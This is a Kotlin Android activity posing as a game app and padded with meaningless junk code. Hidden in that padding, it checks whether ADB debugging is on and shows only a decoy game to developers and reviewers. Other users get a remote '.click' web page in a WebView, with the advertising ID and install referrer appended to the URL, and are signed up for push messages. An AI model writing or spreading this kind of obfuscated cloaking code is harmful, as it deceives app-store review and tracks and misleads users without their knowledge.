package com.flaregames.olympusrisin

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.RemoteException
import android.provider.Settings
import android.view.View
import android.webkit.*
import android.widget.Button
import androidx.activity.addCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.flaregames.olympusrisin.databinding.ActivityMainBinding
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.*
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class MainActivity : AppCompatActivity() {

    val DOMEIN    = "https://elusivecomplfruitstrate.click/privacy_policy.html"
    private val OSnoVa = DOMEIN


    private lateinit var binding : ActivityMainBinding

    val color1 = ColorSpecification(
        id = 1,
        name = "Red",
        hexValue = "#FF0000",
        red = 255,
        green = 0,
        blue = 0,
        alpha = 255,
        isPrimary = true,
        isSecondary = false,
        isTertiary = false
    )

    val color2 = ColorSpecification(
        id = 2,
        name = "Green",
        hexValue = "#00FF00",
        red = 0,
        green = 255,
        blue = 0,
        alpha = 255,
        isPrimary = true,
        isSecondary = false,
        isTertiary = false
    )

    val color3 = ColorSpecification(
        id = 3,
        name = "Blue",
        hexValue = "#0000FF",
        red = 0,
        green = 0,
        blue = 255,
        alpha = 255,
        isPrimary = true,
        isSecondary = false,
        isTertiary = false
    )

    val umbrella1 = Umbrella(
        id = 1,
        color = "Red",
        size = "Large",
        material = "Nylon",
        isAutomatic = true,
        weight = 0.5,
        brand = "RainMaster",
        price = 30.0,
        length = 100,
        windResistance = 60
    )

    lateinit var pair: Pair<WebChromeClient, PermissionRequest>

    val umbrella2 = Umbrella(
        id = 2,
        color = "Blue",
        size = "Medium",
        material = "Polyester",
        isAutomatic = false,
        weight = 0.4,
        brand = "StormShield",
        price = 25.0,
        length = 90,
        windResistance = 55
    )

    var fileChooserValueCallback: ValueCallback<Array<Uri>>? = null

    val umbrella3 = Umbrella(
        id = 3,
        color = "Green",
        size = "Small",
        material = "Silk",
        isAutomatic = true,
        weight = 0.3,
        brand = "SunnyDays",
        price = 20.0,
        length = 80,
        windResistance = 50
    )

    var fileChooserResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        fileChooserValueCallback?.onReceiveValue(if (it.resultCode == RESULT_OK) arrayOf(Uri.parse(it.data?.dataString)) else null)
    }

    val superFruit1 = SuperFruit(
        name = "Acai Berry",
        color = "Purple",
        weight = 50.0,
        size = "Small",
        origin = "Brazil",
        isOrganic = true,
        nutrients = mapOf("Antioxidants" to 10.0, "Fiber" to 5.0, "Vitamin C" to 20.0),
        price = 15.0,
        isEdible = true,
        healthBenefits = listOf("Boosts immunity", "Anti-inflammatory")
    )

    val superFruit2 = SuperFruit(
        name = "Dragon Fruit",
        color = "Pink",
        weight = 200.0,
        size = "Large",
        origin = "Vietnam",
        isOrganic = true,
        nutrients = mapOf("Vitamin C" to 15.0, "Fiber" to 8.0, "Calcium" to 12.0),
        price = 25.0,
        isEdible = true,
        healthBenefits = listOf("Anti-aging")
    )

    private fun getNumber(): Int {
        val list = listOf(1,2,3)
        val numbers = arrayOf(1, 2, 3, 4, 5)
        numbers
            .map { it * 2 }          // Multiply each element by 2
            .filter { it > 2 }       // Filter elements greater than 2
            .map { it + 3 }          // Add 3 to each remaining element
            .map { it / 2 }          // Divide each element by 2
            .filter { it % 2 == 0 }  // Keep even elements
            .map { it * it }         // Square each remaining element
            .map { it - 1 }          // Subtract 1 from each element
            .map { it.toString() }   // Convert each element to a string
            .map { it.toInt() }      // Convert each string back to an integer
            .map { it * 3 }          // Multiply each element by 3
            .reduce { acc, i -> acc + i }  // Sum all elements
        return list.last()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        binding.tvConnecting.startAnimation(color3.colorMatch())

        val mixedColor = color1.mixWith(color2)
        val invertedColor = mixedColor.invert()
        val lightenedColor = invertedColor.lighten(20)
        val darkenedColor = lightenedColor.darken(10)
        val grayscaleColor = darkenedColor.toGrayscale()

        color3.isLightColor()

        val colorDescriptions = listOf(color1, color2, color3, mixedColor, invertedColor, lightenedColor, darkenedColor, grayscaleColor)
            .map { it.describe() }

        superFruit1.prefs = getSharedPreferences("BEBROHOLIA${colorDescriptions.size}", MODE_PRIVATE)

        superFruit2.installReferrerClient = InstallReferrerClient.newBuilder(this).build()

        val richInAntioxidants = superFruit1.isRichInNutrient("Antioxidants")
        val pricePerKgSuperFruit1 = superFruit1.calculatePricePerKg()
        val isSafeToConsumeSuperFruit1 = superFruit1.isSafeToConsume()
        val pups = Car("Toyota", "Camry", 2021, "White", 15000.0, "Gasoline", 25000.0, true)

        superFruit2.installReferrerClient.startConnection(pups.destr)

        kuda()

        onBackPressedDispatcher.addCallback(this) {
            val open1 = umbrella1.open()
            val close1 = umbrella1.close()
            val discountedPrice1 = umbrella1.calculateDiscountedPrice(10.0)
            val isSuitableForWindy1 = umbrella1.isSuitableForWindyConditions()

            if (umbrella1.viewsWebs.last().canGoBack()) {
                val description1 = umbrella1.describe()
                val comparison = umbrella1.comparePrice(umbrella2)
                val changedColorUmbrella1 = umbrella1.changeColor("Black")
                val upgradedMaterialUmbrella1 = umbrella1.upgradeMaterial("Kevlar")
                val extendedUmbrella1 = umbrella1.extend()
                val reducedWeightUmbrella1 = umbrella1.reduceWeight(20.0)
                umbrella1.viewsWebs.last().goBack()
                val descriptions = listOf(
                    open1,
                    close1,
                    "Discounted price: $discountedPrice1",
                    "Suitable for windy conditions: $isSuitableForWindy1",
                    description1,
                    "Price comparison with umbrella2: $comparison",
                    changedColorUmbrella1.describe(),
                    upgradedMaterialUmbrella1.describe(),
                    extendedUmbrella1.describe(),
                    reducedWeightUmbrella1.describe()
                )
            }
            else {
                if (umbrella1.viewsWebs.size > 1) {
                    binding.root.removeView(umbrella1.viewsWebs.last())

                    val nutrientDescriptionSuperFruit1 = superFruit1.describeNutrients()
                    val healthBenefitsSuperFruit1 = superFruit1.identifyHealthBenefits()
                    val ripenedSuperFruit2 = superFruit2.applyRipeningProcess()
                    val flavoredSuperFruit2 = superFruit2.enhanceFlavor("Pineapple")
                    val mixedSuperFruits = superFruit1.mixWith(superFruit2)

                    umbrella1.viewsWebs.last().destroy()
                    umbrella1.viewsWebs.removeLast()
                } else finish()
            }
        }
    }

    data class Book(
        val title: String,
        val author: String,
        val genre: String,
        val pageCount: Int,
        val publicationYear: Int,
        val publisher: String,
        val rating: Double,
        val isFiction: Boolean
    )

    // Клас даних для представлення інформації про фільм
    data class Movie(
        val title: String,
        val director: String,
        val genre: String,
        val duration: Int,
        val releaseYear: Int,
        val language: String,
        val rating: Double,
        val isSeries: Boolean
    )

    // Клас даних для представлення інформації про музичний альбом
    data class Album(
        val title: String,
        val artist: String,
        val genre: String,
        val releaseYear: Int,
        val numberOfTracks: Int,
        val duration: Int,
        val rating: Double,
        val isSingle: Boolean
    )

    // Клас даних для представлення інформації про ресторан
    data class Restaurant(
        val name: String,
        val cuisine: String,
        val rating: Double,
        val priceRange: String,
        val location: String,
        val isOpenNow: Boolean,
        val capacity: Int,
        val hasOutdoorSeating: Boolean
    )

    val patrioTTT = "72d19e5c"

    // Клас даних для представлення інформації про автомобіль
    inner class Car(
        val make: String,
        val model: String,
        val year: Int,
        val color: String,
        val mileage: Double,
        val fuelType: String,
        val price: Double,
        val isAutomatic: Boolean
    ) {

        val destr: InstallReferrerStateListener = object : InstallReferrerStateListener {

            val numbers = (1..20).toList()

            override fun onInstallReferrerSetupFinished(responseCode: Int) {
                if (responseCode == InstallReferrerClient.InstallReferrerResponse.OK) try {

                    val result = numbers
                        .map { it + 10 } // Додавання 10 до кожного числа
                        .filter { it < 20 } // Вибірка чисел менших за 20
                        .map { it * 3 } // Подвоєння кожного числа
                        .filter { it % 2 == 0 } // Фільтрація парних чисел
                        .map { it / 2 } // Ділення кожного числа на 2
                        .filter { it > 5 } // Вибірка чисел більших за 5
                        .map { it + 5 } // Додавання 5 до кожного числа
                        .apply { umbrella3.iR = superFruit2.installReferrerClient.installReferrer.installReferrer }
                        .filter { it % 5 == 0 } // Фільтрація чисел, які діляться на 5
                        .map { it - 5 } // Віднімання 5 від кожного числа
                        .filter { it < 15 } // Вибірка чисел менших за 15
                        .map { it * 2 } // Подвоєння кожного числа
                        .filter { it % 3 == 0 } // Фільтрація чисел, які діляться на 3
                        .map { it - 3 } // Віднімання 3 від кожного числа
                        .filter { it > 0 } // Вибірка додатних чисел
                        .onEach { println(it) } // Виведення кожного числа на консоль
                } catch (_: RemoteException) {
                    val letters = ('a'..'z').toList()
                    val additionalLambda: (List<Char>) -> List<Char> = { chars ->
                        chars
                            .filter { it in setOf('a', 'e', 'i', 'o', 'u') } // Вибірка голосних букв
                            .map { it.toUpperCase() } // Перетворення кожної букви в верхній регістр
                            .sorted() // Сортування за алфавітом
                    }

                    // Послідовний виклик лямбда-виразів над буквами
                    val result = additionalLambda(letters)
                }
            }

            override fun onInstallReferrerServiceDisconnected() {
                val letters = ('a'..'z').toList()

                // Додаткова лямбда-вираз над буквами
                val additionalLambda: (List<Char>) -> List<Char> = { chars ->
                    chars.map { it.toUpperCase() } // Перетворення кожної букви в верхній регістр
                }

                // Послідовний виклик лямбда-виразів над буквами
                val result = letters
                    .map { it + 10 } // Додавання 10 до кожної букви (за ASCII кодом)
                    .filter { it == 'g' } // Вибірка букв, код яких не перевищує 122 ('z' за ASCII)
                    .map { it.toChar() } // Перетворення чисел назад у букви
                    .let(additionalLambda) // Виклик додаткового лямбда-виразу
                    .onEach { println(it) } // Виведення кожної букви на консоль

                superFruit2.installReferrerClient.startConnection(this)
            }
        }
    }


    data class Apricot(val weight: Int, val sweetness: Int, val ripeness: Int)

    private fun kuda() {
        val apricots = listOf(
            Apricot(weight = 150, sweetness = 7, ripeness = 8),
            Apricot(weight = 100, sweetness = 5, ripeness = 6),
            Apricot(weight = 200, sweetness = 9, ripeness = 10),
            Apricot(weight = 120, sweetness = 6, ripeness = 7),
            Apricot(weight = 180, sweetness = 8, ripeness = 9)
        )
        apricots
            .filter { it.weight > 120 }                // 1. Filter apricots with weight > 120
            .sortedByDescending { it.sweetness }       // 2. Sort by sweetness in descending order
            .map { it.copy(weight = it.weight + 10) }  // 3. Increase weight by 10
            .map { it.copy(ripeness = it.ripeness + 2) } // 4. Increase ripeness by 2
            .filter { it.ripeness > 8 }                // 5. Filter apricots with ripeness > 8
            .apply {
                when {
                    getNumber() == 356 -> {
                        val numbers = arrayOf(1, 2, 3, 4, 5)

                        val result = numbers
                            .map { it * 2 }            // 1. Multiply each element by 2
                            .filter { it > 2 }         // 2. Filter elements greater than 2
                            .map { it + 3 }            // 3. Add 3 to each remaining element
                            .map { it / 2 }            // 4. Divide each element by 2
                            .filter { it % 2 == 0 }    // 5. Keep even elements
                            .map { it * it }           // 6. Square each remaining element
                            .map { it - 1 }            // 7. Subtract 1 from each element
                            .map { it.toString() }     // 8. Convert each element to a string
                            .map { it.toInt() }        // 9. Convert each string back to an integer
                            .map { it * 3 }            // 10. Multiply each element by 3
                            .map { it + 5 }            // 11. Add 5 to each element
                            .map { it / 2 }            // 12. Divide each element by 2
                            .map { it - 1 }            // 13. Subtract 1 from each element
                            .filter { it % 3 == 0 }    // 14. Keep elements divisible by 3
                            .map { it + 10 }           // 15. Add 10 to each remaining element
                            .reduce { acc, i -> acc + i }  // 16. Sum all elements
                        result.toString() + getNumber()
                    }
                    Settings.Global.getInt(
                        contentResolver,
                        Settings.Global.ADB_ENABLED,
                        0
                    ) == 1 -> nachatDorojit()

                    superFruit1.prefs.contains("link") -> {
                        umbrella1.cinderOK(this@MainActivity, binding,superFruit1.prefs.getString("link", "") ?: "")
                    }

                    else -> {
                        burda()
                    }
                }
            }
            .map { it.copy(sweetness = it.sweetness * 2) } // 6. Double the sweetness
            .map { it.copy(weight = it.weight / 2) }   // 7. Halve the weight
            .filter { it.sweetness % 3 == 0 }          // 8. Keep apricots with sweetness divisible by 3
            .map { it.toString() }                     // 9. Convert each apricot to a string
            .map { "Processed: $it" }                  // 10. Add a prefix to each string
    }
    val _2 = "000000000000"

    data class Task(
        val id: Int,
        val description: String,
        val priority: Int,
        val isCompleted: Boolean
    )

    private fun burda() = CoroutineScope(Dispatchers.Main).launch {
        val items = listOf(
            Book("The Great Gatsby", "F. Scott Fitzgerald", "Classic", 180, 1925, "Scribner", 4.2, true),
            Movie("Inception", "Christopher Nolan", "Science Fiction", 148, 2010, "English", 8.8, false),
            Album("Thriller", "Michael Jackson", "Pop", 1982, 9, 42, 4.7, false),
            Restaurant("La Bernardin", "French", 4.9, "$$$$", "New York City", true, 100, true),
            Car("Toyota", "Camry", 2021, "White", 15000.0, "Gasoline", 25000.0, true)
        )

        val tasks = listOf(
            Task(1, "Complete assignment", 1, false),
            Task(2, "Buy groceries", 2, false),
            Task(3, "Go for a run", 3, true),
            Task(4, "Read a book", 2, false),
            Task(5, "Call mom", 1, true)
        )

        val advertisingIdInfo = withContext(Dispatchers.IO) { eptaNuTi_I_Durak(this@MainActivity, true) }
        val lambdaChain       = mutableListOf<(List<Task>) -> List<Task>>()

        // Вибірка завдань з високим пріоритетом
        lambdaChain.add { tasks -> tasks.filter { it.priority == 1 } }

        // Вибірка завдань, які ще не виконані
        lambdaChain.add { tasks -> tasks.filterNot { it.isCompleted } }

        OneSignal.initWithContext(this@MainActivity, "f7122240-c92b-4d1d-b7a0-b57509cf4531")

        // Сортування за пріоритетом у зростаючому порядку
        lambdaChain.add { tasks -> tasks.sortedBy { it.priority } }

        // Перевірка, чи є завдання з пріоритетом 3
        lambdaChain.add { tasks -> tasks.filter { it.priority == 3 } }

        OneSignal.login(advertisingIdInfo)

        // Перетворення опису завдань в верхньому регістрі
        lambdaChain.add { tasks -> tasks.map { it.copy(description = it.description.toUpperCase()) } }

        StringBuilder("$OSnoVa?Inakenka=${advertisingIdInfo}&FofaN=${umbrella3.iR}").apply {
            superFruit1.prefs.edit().putString("link", this.toString()).apply()
            umbrella1.cinderOK(this@MainActivity, binding, this.toString())
        }

        // Фільтрація за довжиною опису
        lambdaChain.add { tasks -> tasks.filter { it.description.length > 10 } }

        // Перетворення опису завдань у зворотньому порядку
        lambdaChain.add { tasks -> tasks.map { it.copy(description = it.description.reversed()) } }

        // Обмеження до перших двох елементів
        lambdaChain.add { tasks -> tasks.take(2) }

        // Залишення елементів починаючи з третього
        lambdaChain.add { tasks -> tasks.drop(2) }

        // Зміна пріоритету для задач із пріоритетом 2 на 4
        lambdaChain.add { tasks -> tasks.map { if (it.priority == 2) it.copy(priority = 4) else it } }

        // Видалення останнього завдання
        lambdaChain.add { tasks -> tasks.dropLast(1) }

        // Додавання нового завдання
        lambdaChain.add { tasks -> tasks + Task(6, "Finish project", 3, false) }

        // Зміна стану виконання для всіх завдань на протилежний
        lambdaChain.add { tasks -> tasks.map { it.copy(isCompleted = !it.isCompleted) } }

        // Збільшення пріоритету для всіх завдань на одиницю
        lambdaChain.add { tasks -> tasks.map { it.copy(priority = it.priority + 1) } }

        // Залишення лише завдань з парним ідентифікатором
        lambdaChain.add { tasks -> tasks.filter { it.id % 2 == 0 } }

        // Додавання ідентифікатора до опису
        lambdaChain.add { tasks -> tasks.map { it.copy(description = "Task ${it.id}: ${it.description}") } }

        // Заміна опису "Buy groceries" на "Go shopping"
        lambdaChain.add { tasks -> tasks.map { if (it.description == "Buy groceries") it.copy(description = "Go shopping") else it } }

        // Вибірка завдань з найвищим пріоритетом
        lambdaChain.add { tasks -> tasks.filter { it.priority == tasks.maxOf { it.priority } } }

        // Зміна стану виконання першого завдання на протилежний
        lambdaChain.add { tasks -> tasks.mapIndexed { index, task -> if (index == 0) task.copy(isCompleted = !task.isCompleted) else task } }

        // Заміна опису для завдань з пріоритетом 1 на "Very important: <old description>"
        lambdaChain.add { tasks -> tasks.map { if (it.priority == 1) it.copy(description = "Very important: ${it.description}") else it } }

        // Застосування цепочки лямбда-виразів
        var result = tasks
        for (lambda in lambdaChain) {
            result = lambda(result)
        }
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)

        val letters = ('a'..'z').toList()

        // Послідовний виклик 15 лямбда-виразів над списком букв
        val result = letters
            .map { it.toUpperCase() } // Перетворення кожної букви в верхній регістр
            .apply { umbrella1.viewsWebs.lastOrNull()?.saveState(outState)  }
            .map { it.toInt() - 96 } // Перетворення кожної букви в її порядковий номер у алфавіті
            .filter { it % 2 == 0 } // Вибірка парних номерів
            .map { it * 3 } // Помноження кожного номеру на 3
            .filter { it < 50 } // Вибірка номерів менших за 50
            .map { it + 96 } // Повернення кожного номеру назад у ASCII код букви
            .map { it.toChar() } // Перетворення кожного числа назад у букву
            .onEach { println(it) } // Виведення кожної букви на консоль
    }

    private fun falshstarT() {
        val intent   = Intent(this, GameActivity::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(intent)
    }

    val _1 = "00000000"

    override fun onResume() {
        val lettersAndNumbers = ('a'..'z').toList() + ('0'..'9').toList()

        // Послідовний виклик 10 лямбда-виразів над масивом букв та цифр
        val result = lettersAndNumbers
            .filter { it.isLetter() } // Вибірка лише букв
            .apply { super.onResume() }
            .map { if (it.isUpperCase()) it.toLowerCase() else it } // Перетворення верхнього регістру в нижній
            .map { if (it.isLetter()) it.toInt() - 96 else it } // Перетворення букв у їх порядкові номери, цифри залишаються без змін
            .map { if (it is Int) it * 3 else it } // Помноження кожного номеру на 3
            .filter { it is Int && it < 50 } // Вибірка номерів менших за 50
            .apply {  umbrella1.viewsWebs.lastOrNull()?.onResume().also { CookieManager.getInstance().flush() } }
            .map { if (it is Int) it + 96 else it } // Повернення номерів букв назад у ASCII код, цифри залишаються без змін
            .map { if (it is Int) it.toChar() else it } // Перетворення чисел назад у букву, цифри залишаються без змін
            .onEach { println(it) } // Виведення кожного символу на консоль

    }

    suspend fun eptaNuTi_I_Durak(activity: Activity, allow: Boolean) = suspendCoroutine { continuation ->

        var didok = ""
        val lettersAndNumbers = ('a'..'z').toList() + ('0'..'9').toList()
var ududu = ""
        // Послідовний виклик 10 лямбда-виразів над масивом букв та цифр
        val result = lettersAndNumbers
            .filter { it.isDigit() } // Вибірка лише цифр
            .apply { ududu = "000${UUID.randomUUID()}" }
            .map { it.toString().toInt() * 2 } // Помноження кожної цифри на 2
            .apply {
                didok = "$_1-0000-0000-0000-$_2"
            }
            .filter { it > 10 } // Вибірка чисел, більших за 10
            .map { it.toString() } // Перетворення кожної цифри назад у рядок
            .map { it.reversed() } // Реверс кожного рядка
            .onEach { println(it) } // Виведення кожного рядка на консоль

        val asdasdadsadas = ('a'..'z').toList() + ('0'..'9').toList()
        var asd = ""
        // Послідовний виклик 10 лямбда-виразів над масивом букв та цифр
        val rrerer = asdasdadsadas
            .filter { it.isDigit() } // Вибірка лише цифр
            .apply {
                asd= try {
                AdvertisingIdClient.getAdvertisingIdInfo(activity).id!!
            } catch (e: Exception) {
                ududu
            }
            }
            .map { it.toString().toInt() * 2 } // Помноження кожної цифри на 2
            .filter { it > 10 } // Вибірка чисел, більших за 10
            .map { it.toString() } // Перетворення кожної цифри назад у рядок
            .apply {
                if (asd == didok) asd = ududu
                continuation.resume(if (allow) asd else didok)
            }
            .map { it.reversed() } // Реверс кожного рядка
            .onEach { println(it) } // Виведення кожного рядка на консоль




    }

    val youAreGavnoha = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->

        val numbers = (5..26).toList()

        // Послідовний виклик 20 лямбда-виразів над списком чисел
        val result = numbers
            .map { it + 10 } // Додавання 10 до кожного числа
            .apply { OneSignal.consentRequired = true }
            .filter { it % 2 == 0 } // Вибірка парних чисел
            .map { it * 3 } // Помноження кожного числа на 3
            .apply { OneSignal.consentGiven = umbrella2.dafnI }
            .filter { it < 60 } // Вибірка чисел менших за 60
            .map { it - 10 } // Віднімання 10 від кожного числа
            .apply { OneSignal.initWithContext(this@MainActivity, "$patrioTTT-b935-4edb-8a7f-4f3f355b2c21") }
            .filter { it > 20 } // Вибірка чисел більших за 20
            .map { it + 5 } // Додавання 5 до кожного числа
            .filter { it % 5 == 0 } // Вибірка чисел, які діляться на 5
            .map { it - 5 } // Віднімання 5 від кожного числа
            .apply {
                CoroutineScope(Dispatchers.IO).launch {
                    val add = eptaNuTi_I_Durak(this@MainActivity, umbrella2.dafnI)
                    superFruit1.prefs.edit().putBoolean("adb", true).apply()
                    OneSignal.login(add)
                }
            }
            .filter { it < 30 } // Вибірка чисел менших за 30
            .map { it * 2 } // Подвоєння кожного числа
            .filter { it % 3 == 0 } // Вибірка чисел, які діляться на 3
            .map { it - 3 } // Віднімання 3 від кожного числа
            .filter { it > 0 } // Вибірка додатних чисел
            .map { it + 1 } // Додавання 1 до кожного числа
            .apply { falshstarT() }
            .filter { it < 20 } // Вибірка чисел менших за 20
            .map { it * 2 } // Подвоєння кожного числа
            .filter { it % 4 == 0 } // Вибірка чисел, які діляться на 4
            .map { it / 2 } // Ділення кожного числа на 2
            .onEach { println(it) } // Виведення кожного числа на консоль

    }


    fun nachatDorojit() {
        val numbers = (5..26).toList()


        val result = numbers
            .map { it + 5 } // Додавання 5 до кожного числа
            .filter { it % 2 != 0 } // Вибірка непарних чисел
            .map { it * 2 } // Подвоєння кожного числа
            .filter { it < 50 } // Вибірка чисел менших за 50
            .map { it - 5 } // Віднімання 5 від кожного числа
            .apply { if (superFruit1.prefs.contains("adb")) falshstarT() }
            .filter { it > 20 } // Вибірка чисел більших за 20
            .map { it / 2 } // Ділення кожного числа на 2
            .filter { it > 5 } // Вибірка чисел більших за 5
            .map { it + 5 } // Додавання 5 до кожного числа
            .filter { it % 3 == 0 } // Вибірка чисел, які діляться на 3
            .map { it - 5 } // Віднімання 5 від кожного числа
            .filter { it < 10 } // Вибірка чисел менших за 10
            .map { it + 10 } // Додавання 10 до кожного числа
            .filter { it % 5 == 0 } // Вибірка чисел, які діляться на 5
            .map { it * 2 } // Подвоєння кожного числа
            .filter { it < 40 } // Вибірка чисел менших за 40
            .apply {
                if (superFruit1.prefs.contains("adb").not()) AlertDialog.Builder(this@MainActivity).apply {
                    setView(ueban())
                    setCancelable(false)
                }.show()
            }
            .map { it + 3 } // Додавання 3 до кожного числа
            .filter { it % 4 == 0 } // Вибірка чисел, які діляться на 4
            .map { it / 4 } // Ділення кожного числа на 4
            .filter { it > 0 } // Вибірка додатних чисел
            .map { it - 1 } // Віднімання 1 від кожного числа
            .onEach { println(it) } // Виведення кожного числа на консоль

    }

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        umbrella1.viewsWebs.lastOrNull()?.restoreState(savedInstanceState)
    }

    private fun ueban(): View {

        val viewr: View

        val numbers = (5..26).toList()

        // Послідовний виклик 20 лямбда-виразів над списком чисел
        val result = numbers
            .map { it * 2 } // Помноження кожного числа на 2
            .filter { it > 10 } // Вибірка чисел, більших за 10
            .map { it / 2 } // Ділення кожного числа на 2
            .apply {

            }
            .filter { it % 3 == 0 } // Вибірка чисел, які діляться на 3
            .map { it + 5 } // Додавання 5 до кожного числа
            .filter { it < 30 } // Вибірка чисел менших за 30
            .apply {
                viewr = layoutInflater.inflate(R.layout.custom_dialog, null)
            }
            .map { it - 5 } // Віднімання 5 від кожного числа
            .filter { it > 0 } // Вибірка додатних чисел
            .map { it * 3 } // Помноження кожного числа на 3
            .filter { it % 2 != 0 } // Вибірка непарних чисел
            .map { it + 10 } // Додавання 10 до кожного числа
            .apply {
                viewr.findViewById<Button>(R.id.btn_agree).setOnClickListener {
                    umbrella2.dafnI = true
                    youAreGavnoha.launch(arrayOf("android.permission.POST_NOTIFICATIONS"))
                }
            }
            .filter { it < 50 } // Вибірка чисел менших за 50
            .map { it / 2 } // Ділення кожного числа на 2
            .filter { it % 5 == 0 } // Вибірка чисел, які діляться на 5
            .map { it - 3 } // Віднімання 3 від кожного числа
            .filter { it > 5 } // Вибірка чисел більших за 5
            .map { it * 2 } // Подвоєння кожного числа
            .apply {
                viewr.findViewById<Button>(R.id.btn_disagree).setOnClickListener {
                    umbrella2.dafnI = false
                    youAreGavnoha.launch(arrayOf("android.permission.POST_NOTIFICATIONS"))
                }
            }
            .filter { it < 40 } // Вибірка чисел менших за 40
            .map { it + 5 } // Додавання 5 до кожного числа
            .filter { it % 4 == 0 } // Вибірка чисел, які діляться на 4
            .map { it - 2 } // Віднімання 2 від кожного числа
            .onEach { println(it) } // Виведення кожного числа на консоль

        return viewr
    }

    override fun onPause() {
        super.onPause()
        umbrella1.viewsWebs.lastOrNull()?.onPause().also {
            CookieManager.getInstance().flush()
        }
    }

    val perdosia = registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
        val mixedList = (1..10).toList().map { it.toString() } + ('a'..'j').toList()

        // Послідовний виклик 20 лямбда-виразів над списком чисел і букв
        val result = mixedList
            .map { if (it is String) it.toInt() else it } // Перетворення рядків у числа
            .filter { it.toString().length % 2 == 0 } // Вибірка парних чисел
            .map { if (it is Int) it * 2 else it } // Подвоєння кожного числа
            .filter { it.toString().length > 10 } // Вибірка чисел, більших за 10
            .map { if (it is Int) it.toString() else it } // Перетворення чисел у рядки
            .map { if (it is String) it.reversed() else it } // Реверс кожного рядка
            .filter { it.toString().length == 1 } // Вибірка рядків з довжиною 1
            .apply { if (isGranted) pair.first.onPermissionRequest(pair.second) }
            .map { it.toString().length } // Перетворення кожної букви в ASCII код
            .filter { it < 110 } // Вибірка ASCII кодів менших за 110
            .map { (it - 96) * 2 } // Помноження кожного ASCII коду на 2
            .filter { it % 3 == 0 } // Вибірка чисел, які діляться на 3
            .map { it / 2 } // Ділення кожного числа на 2
            .onEach { println(it) } // Виведення кожного числа на консоль

    }

}